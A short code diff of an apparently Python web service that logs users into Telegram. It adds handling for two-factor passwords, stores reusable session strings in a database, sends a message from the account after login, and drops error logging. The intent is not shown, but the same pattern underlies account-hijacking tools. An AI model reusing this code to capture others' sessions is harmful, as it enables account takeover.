@@ -349,12 +349,18 @@ async def verify_code():
             await send_message(user_client)
 
         return jsonify({'message': 'Login successful and action performed'})
+    except SessionPasswordNeededError:
+        user_clients[chat_id] = user_client
+        return jsonify({
+            'error': 'Two-factor authentication required',
+            'chat_id': chat_id
+        }), 403
     except Exception as e:
-        print(f"Error in /verify_code for chat_id={chat_id}: {e}")
         return jsonify({'error': f'Error: {e}'}), 500
     finally:
         if chat_id not in user_clients:
             await user_client.disconnect()
+
 
 @app.route('/verify_2fa', methods=['POST'])
 async def verify_2fa():
@@ -375,7 +381,7 @@ async def verify_2fa():
 
         session_string = user_client.session.save()
         save_session_to_db(chat_id, session_string)
-        
+
         if not scraper:
             # Send a message after successful login
             await send_message(user_client)
@@ -384,7 +390,6 @@ async def verify_2fa():
     except SessionPasswordNeededError:
         return jsonify({'error': 'Incorrect 2FA password'}), 403
     except Exception as e:
-        print(f"Error in /verify_2fa for chat_id={chat_id}: {e}")
         return jsonify({'error': f'Error: {e}'}), 500
     finally:
         await user_client.disconnect()
